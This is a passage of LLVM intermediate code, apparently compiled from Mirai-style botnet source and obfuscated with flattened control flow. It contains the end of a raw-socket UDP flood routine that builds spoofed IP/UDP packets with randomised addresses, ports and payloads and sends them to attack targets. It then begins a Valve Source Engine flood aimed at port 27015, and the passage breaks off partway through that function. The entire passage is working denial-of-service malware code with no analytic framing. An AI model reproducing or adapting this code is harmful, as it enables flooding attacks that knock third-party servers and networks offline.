  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  store i32 %69, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1202498434, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1202498434, label %first
    i32 -533498021, label %72
    i32 -1681681710, label %73
    i32 -1405117206, label %77
    i32 -1735044827, label %78
    i32 1477752504, label %84
    i32 351110704, label %87
    i32 1053728750, label %88
    i32 -141037707, label %94
    i32 -1314698314, label %139
    i32 -1436732839, label %143
    i32 -1307724015, label %172
    i32 553698723, label %175
    i32 -337994051, label %176
    i32 -1113096787, label %177
    i32 -1465039177, label %183
    i32 1677789628, label %206
    i32 860830214, label %227
    i32 -1650443437, label %231
    i32 -1852772648, label %235
    i32 -1086435501, label %240
    i32 66711288, label %245
    i32 1836041471, label %250
    i32 -1970393033, label %255
    i32 1557434037, label %260
    i32 -3940599, label %265
    i32 42536100, label %269
    i32 -1910699618, label %273
    i32 -872838536, label %320
    i32 -639509032, label %323
    i32 640247906, label %324
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %70 = icmp sgt i32 %.reload, 1460
  %71 = select i1 %70, i32 -533498021, i32 -1681681710
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i16 1460, i16* %18, align 2
  store i32 -1681681710, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %74, i32* %10, align 4
  %75 = icmp eq i32 %74, -1
  %76 = select i1 %75, i32 -1405117206, i32 -1735044827
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 640247906, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #6
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 1477752504, i32 351110704
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  store i32 640247906, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1053728750, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  %93 = select i1 %92, i32 -141037707, i32 553698723
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  store i8* %95, i8** %99, align 8
  %100 = load i8**, i8*** %11, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i64 1
  %108 = bitcast %struct.iphdr* %107 to %struct.udphdr*
  store %struct.udphdr* %108, %struct.udphdr** %22, align 8
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, 15
  %113 = or i8 %112, 64
  store i8 %113, i8* %110, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
  %119 = load i8, i8* %12, align 1
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8 %119, i8* %121, align 1
  %122 = load i16, i16* %18, align 2
  %123 = zext i16 %122 to i64
  %124 = add i64 28, %123
  %125 = trunc i64 %124 to i16
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 2
  store i16 %126, i16* %128, align 2
  %129 = load i16, i16* %13, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 3
  store i16 %130, i16* %132, align 4
  %133 = load i8, i8* %14, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 5
  store i8 %133, i8* %135, align 4
  %136 = load i8, i8* %15, align 1
  %137 = icmp ne i8 %136, 0
  %138 = select i1 %137, i32 -1314698314, i32 -1436732839
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 4
  store i16 %140, i16* %142, align 2
  store i32 -1436732839, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 6
  store i8 17, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 8
  store i32 %146, i32* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 9
  store i32 %154, i32* %156, align 4
  %157 = load i16, i16* %16, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %17, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 1
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %18, align 2
  %166 = zext i16 %165 to i64
  %167 = add i64 8, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  store i32 -1307724015, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  store i32 1053728750, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -337994051, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1113096787, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = load i8, i8* %5, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 -1465039177, i32 -639509032
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %23, align 8
  %189 = load i8*, i8** %23, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %24, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %25, align 8
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i64 1
  %196 = bitcast %struct.udphdr* %195 to i8*
  store i8* %196, i8** %26, align 8
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  %205 = select i1 %204, i32 1677789628, i32 860830214
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 1
  %212 = load i32, i32* %211, align 4
  %213 = call i32 @ntohl(i32 %212) #7
  %214 = call i32 @rand_next()
  %215 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 2
  %220 = load i8, i8* %219, align 4
  %221 = zext i8 %220 to i32
  %222 = lshr i32 %214, %221
  %223 = add i32 %213, %222
  %224 = call i32 @htonl(i32 %223) #7
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  store i32 860830214, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %20, align 4
  %229 = icmp eq i32 %228, -1
  %230 = select i1 %229, i32 -1650443437, i32 -1852772648
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  store i32 -1852772648, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i16, i16* %13, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  %239 = select i1 %238, i32 -1086435501, i32 66711288
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  store i32 66711288, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i16, i16* %16, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  %249 = select i1 %248, i32 1836041471, i32 -1970393033
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = call i32 @rand_next()
  %252 = trunc i32 %251 to i16
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  store i32 -1970393033, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i16, i16* %17, align 2
  %257 = zext i16 %256 to i32
  %258 = icmp eq i32 %257, 65535
  %259 = select i1 %258, i32 1557434037, i32 -3940599
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  store i32 -3940599, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8, i8* %19, align 1
  %267 = icmp ne i8 %266, 0
  %268 = select i1 %267, i32 42536100, i32 -1910699618
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %26, align 8
  %271 = load i16, i16* %18, align 2
  %272 = zext i16 %271 to i32
  call void @rand_str(i8* %270, i32 %272)
  store i32 -1910699618, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %18, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %10, align 4
  %306 = load i8*, i8** %23, align 8
  %307 = load i16, i16* %18, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  store i32 -872838536, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %9, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %9, align 4
  store i32 -1113096787, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 -337994051, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %323, %320, %273, %269, %265, %260, %255, %250, %245, %240, %235, %231, %227, %206, %183, %177, %176, %175, %172, %143, %139, %94, %88, %87, %84, %78, %77, %73, %72, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 29)
  %55 = call i8* @table_retrieve_val(i32 29, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 759755036, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 759755036, label %first
    i32 1060808920, label %59
    i32 -405192819, label %60
    i32 1512052898, label %66
    i32 1022811486, label %69
    i32 1965205744, label %70
    i32 1234311915, label %76
    i32 1084698452, label %124
    i32 764714613, label %128
    i32 -755806800, label %164
    i32 10882865, label %167
    i32 -619298182, label %168
    i32 -1242205739, label %169
    i32 550322261, label %175
    i32 934478135, label %195
    i32 -1000306530, label %216
    i32 -88018294, label %221
    i32 -1562310531, label %226
    i32 -991300055, label %231
    i32 766434910, label %236
    i32 -2059778716, label %241
    i32 909435666, label %246
    i32 1407409594, label %293
    i32 1673117758, label %296
    i32 -1266927081, label %297
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %57 = icmp eq i32 %.reload, -1
  %58 = select i1 %57, i32 1060808920, i32 -405192819
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1266927081, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %10, align 4
  %62 = bitcast i32* %9 to i8*
  %63 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* %62, i32 4) #6
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 1512052898, i32 1022811486
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @close(i32 %67)
  store i32 -1266927081, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1965205744, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %9, align 4
  %72 = load i8, i8* %5, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %71, %73
  %75 = select i1 %74, i32 1234311915, i32 10882865
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call noalias i8* @calloc(i64 128, i64 1) #6
  %78 = load i8**, i8*** %11, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  store i8* %77, i8** %81, align 8
  %82 = load i8**, i8*** %11, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8*, i8** %82, i64 %84
  %86 = load i8*, i8** %85, align 8
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %20, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i64 1
  %90 = bitcast %struct.iphdr* %89 to %struct.udphdr*
  store %struct.udphdr* %90, %struct.udphdr** %21, align 8
  %91 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %92 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %91, i64 1
  %93 = bitcast %struct.udphdr* %92 to i8*
  store i8* %93, i8** %22, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = load i8, i8* %95, align 4
  %97 = and i8 %96, 15
  %98 = or i8 %97, 64
  store i8 %98, i8* %95, align 4
  %99 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, -16
  %103 = or i8 %102, 5
  store i8 %103, i8* %100, align 4
  %104 = load i8, i8* %12, align 1
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* %19, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 32, %108
  %110 = trunc i64 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = load i16, i16* %13, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #7
